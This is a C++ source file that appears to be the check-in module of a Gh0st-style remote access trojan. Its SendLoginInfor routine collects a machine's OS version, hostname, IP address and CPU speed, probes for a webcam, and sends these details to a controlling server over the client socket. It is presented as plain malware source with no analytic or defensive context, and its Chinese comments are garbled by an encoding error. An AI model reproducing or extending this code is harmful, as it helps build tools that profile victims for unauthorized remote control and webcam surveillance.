#include "StdAfx.h"
#include "LoginServer.h"

int SendLoginInfor(IOCPClient * ClientObject, DWORD dwSpeed)
{

	LOGIN_INFOR LoginInfor = { 0 };
	LoginInfor.bToken = TOKEN_LOGIN;


	LoginInfor.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfor.OsVerInfoEx); // ע��ת������

															//���PCName
	char szPCName[MAX_PATH] = { 0 };
	gethostname(szPCName, MAX_PATH);

	//���ClientIP
	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int iLen = sizeof(sockaddr_in);
	getsockname(ClientObject->m_ClientSocket, (SOCKADDR*)&ClientAddr, &iLen);

	DWORD	dwCPUMHz;
	dwCPUMHz = CPUClockMHz();

	BOOL bWebCamIsExist = WebCamIsExist();

	memcpy(LoginInfor.szPCName, szPCName, MAX_PATH);
	LoginInfor.dwSpeed = dwSpeed;
	LoginInfor.dwCPUMHz = dwCPUMHz;
	LoginInfor.ClientAddr = ClientAddr.sin_addr;
	LoginInfor.bWebCamIsExist = bWebCamIsExist;

	int iRet = ClientObject->OnServerSending((char*)&LoginInfor, sizeof(LOGIN_INFOR));


	return iRet;
	
}
DWORD CPUClockMHz()
{
	HKEY	hKey;
	DWORD	dwCPUMHz;
	DWORD	dwReturn = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE,
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey,"~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
	RegCloseKey(hKey);
	return	dwCPUMHz;
}


BOOL WebCamIsExist()
{
	BOOL	bOk = FALSE;

	char	szDeviceName[100], szVer[50];
	for (int i = 0; i < 10 && !bOk; i++)
	{
		bOk = capGetDriverDescriptionA(i, szDeviceName, sizeof(szDeviceName),
			//ϵͳ��API����
			szVer, sizeof(szVer));
	}
	return bOk;
}
